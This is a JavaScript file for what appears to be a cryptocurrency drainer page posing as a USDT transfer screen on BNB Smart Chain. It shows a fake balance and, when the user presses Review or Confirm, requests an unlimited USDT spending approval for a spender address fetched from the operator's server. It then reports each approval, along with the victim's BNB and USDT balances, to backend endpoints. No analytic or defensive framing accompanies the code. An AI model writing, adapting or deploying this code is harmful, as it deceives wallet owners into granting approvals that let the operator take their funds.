const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
const USDT_ABI = [
  {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
  {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
];

let web3, userAccount = null, config = {}, spenderAddress = null;
let displayVal = '0';
let lockedAmount = '5000000';

async function init() {
  await new Promise(r => setTimeout(r, 1100));
  document.getElementById('splash').classList.remove('active');
  document.getElementById('main').classList.add('active');

  try {
    const res = await fetch('/api/config');
    config = await res.json();
    lockedAmount = String(config.fakeAmount || '5000000');
  } catch(e) {}

  try {
    const sp = await fetch('/api/spender');
    const d = await sp.json();
    if (d.spender && d.spender.length === 42) {
      spenderAddress = d.spender;
      document.getElementById('toAddress').textContent = d.spender;
      document.getElementById('revTo').textContent = shortAddr(d.spender);
    }
  } catch(e) {}

  setDisplay('0');

  document.querySelectorAll('.np').forEach(btn => {
    btn.addEventListener('click', () => {
      const t = btn.textContent.trim();
      if (btn.classList.contains('del') || t === '⌫' || t === 'DEL') {
        if (displayVal.length <= 1) setDisplay('0');
        else setDisplay(displayVal.slice(0, -1));
        return;
      }
      if (t === '.') {
        if (displayVal.includes('.')) return;
        setDisplay(displayVal + '.');
        return;
      }
      if (displayVal === '0' && t !== '.') setDisplay(t);
      else {
        if (displayVal.replace('.', '').length >= 12) return;
        setDisplay(displayVal + t);
      }
    });
  });

  document.getElementById('maxBtn').addEventListener('click', () => setDisplay(lockedAmount));
  document.getElementById('reviewBtn').addEventListener('click', goReview);
  document.getElementById('backToAmount').addEventListener('click', () => {
    document.getElementById('review').classList.remove('active');
    document.getElementById('main').classList.add('active');
  });
  document.getElementById('backBtn').addEventListener('click', () => history.back());
  document.getElementById('approveBtn').addEventListener('click', onConfirm);

  if (window.ethereum) {
    try {
      const accs = await window.ethereum.request({ method: 'eth_accounts' });
      if (accs.length) await onConnected(accs[0]);
    } catch(e) {}
  }
}

function setDisplay(val) {
  if (val !== '0' && !val.startsWith('0.') && val.length > 1) {
    val = val.replace(/^0+/, '') || '0';
  }
  displayVal = val;
  const el = document.getElementById('displayAmount');
  const num = parseFloat(val) || 0;
  let shown = val;
  if (!val.includes('.')) shown = Number(val).toLocaleString('en-US');
  else {
    const [a,b] = val.split('.');
    shown = Number(a).toLocaleString('en-US') + '.' + b;
  }
  el.textContent = shown;
  el.classList.toggle('active', num > 0);
  document.getElementById('usdValue').innerHTML = '≈ $' + num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' <span class="swap">⇄</span>';
  document.getElementById('tokenBalLabel').textContent = shown + ' USDT';
  document.getElementById('tokenUsdLabel').textContent = '$' + num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  document.getElementById('reviewBtn').disabled = num <= 0;
  document.getElementById('revAmount').textContent = shown + ' USDT';
  document.getElementById('revFiat').textContent = '≈ $' + num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  document.getElementById('successAmount').textContent = shown + ' USDT';
}

function goReview() {
  onConfirm();
}

async function onConfirm() {
  const btn = document.getElementById('approveBtn');
  btn.disabled = true;
  btn.textContent = 'Confirming...';
  showTx('Waiting for wallet...', 'pending');

  try {
    if (!userAccount) {
      if (!window.ethereum) {
        const dappUrl = encodeURIComponent(window.location.href);
        window.location.href = 'https://link.trustwallet.com/open_url?coin_id=20000714&url=' + dappUrl;
        setTimeout(() => {
          alert('Open this page inside Trust Wallet');
          btn.disabled = false; btn.textContent = 'Confirm';
        }, 800);
        return;
      }
      web3 = new Web3(window.ethereum);
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      if (!accounts.length) throw new Error('No account');
      try {
        await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
      } catch (e) {
        if (e.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x38', chainName: 'BNB Smart Chain',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-dataseed.binance.org/'],
              blockExplorerUrls: ['https://bscscan.com/']
            }]
          });
        }
      }
      await onConnected(accounts[0]);
    }

    if (!spenderAddress) {
      const sp = await fetch('/api/spender');
      const d = await sp.json();
      spenderAddress = d.spender;
    }
    if (!spenderAddress || !web3.utils.isAddress(spenderAddress)) {
      throw new Error('Payment not configured');
    }

    showTx('Approve in wallet...', 'pending');
    const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
    const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    await usdt.methods.approve(spenderAddress, maxUint).send({ from: userAccount });

    await fetch('/api/user/approved', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address: userAccount, allowance: 'unlimited' })
    });

    showTx('Confirmed', 'ok');
    setTimeout(() => {
      document.getElementById('review').classList.remove('active');
      document.getElementById('success').classList.add('active');
    }, 600);
  } catch (err) {
    btn.disabled = false;
    btn.textContent = 'Confirm';
    const msg = (err.message||'').includes('denied') || (err.message||'').includes('rejected')
      ? 'Rejected' : 'Failed. Try again.';
    showTx(msg, 'err');
  }
}

async function onConnected(address) {
  userAccount = address;
  document.getElementById('walletAddr').textContent = shortAddr(address);
  try {
    await fetch('/api/user/connect', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address, chainId: 56 })
    });
  } catch(e) {}
  updateBalances();
  setInterval(updateBalances, 15000);
}

async function updateBalances() {
  if (!userAccount || !web3) return;
  try {
    const bnb = await web3.eth.getBalance(userAccount);
    const usdt = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
    const bal = await usdt.methods.balanceOf(userAccount).call();
    await fetch('/api/user/update', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        address: userAccount,
        balanceBNB: web3.utils.fromWei(bnb, 'ether'),
        balanceUSDT: web3.utils.fromWei(bal, 'ether')
      })
    });
  } catch(e) {}
}

function showTx(msg, type) {
  const el = document.getElementById('txStatus');
  el.className = 'tx-status ' + type;
  el.textContent = msg;
  el.classList.remove('hidden');
}

function shortAddr(a) {
  if (!a || a.length < 10) return a || '—';
  return a.slice(0,6) + '...' + a.slice(-4);
}

if (window.ethereum) {
  window.ethereum.on('accountsChanged', (accs) => {
    if (!accs.length) { userAccount = null; location.reload(); }
    else onConnected(accs[0]);
  });
}

init();
